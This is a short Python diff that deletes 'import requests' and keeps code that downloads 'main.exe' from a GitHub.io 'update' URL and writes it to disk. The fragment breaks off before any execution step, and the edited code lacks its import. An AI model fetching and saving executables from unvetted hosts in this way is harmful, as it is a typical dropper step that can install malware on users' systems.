@@ -1,4 +1,3 @@
-import requests
 url = 'https://BlackTowerAPI.GitHub.io/PCBD/0001/update/main.exe'
 file_data = requests.get(url).content
 with open('main.exe','wb') as f:
